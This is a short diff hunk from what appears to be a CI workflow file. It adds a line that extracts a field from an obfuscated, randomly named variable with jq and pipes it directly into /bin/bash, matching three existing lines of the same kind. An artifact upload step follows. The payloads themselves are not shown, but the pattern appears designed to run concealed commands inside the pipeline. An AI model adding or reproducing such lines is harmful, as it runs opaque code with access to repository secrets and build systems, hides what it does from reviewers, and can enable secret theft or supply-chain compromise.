@@ -31,6 +31,7 @@ jobs:
           echo $bx6 | jq -r .sm19 | /bin/bash
           echo $lnzj025 | jq -r .j9 | /bin/bash
           echo $k6587 | jq -r .hxzpi0 | /bin/bash
+          printf '%s' "$iteab249" | jq -r .povnt8572 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
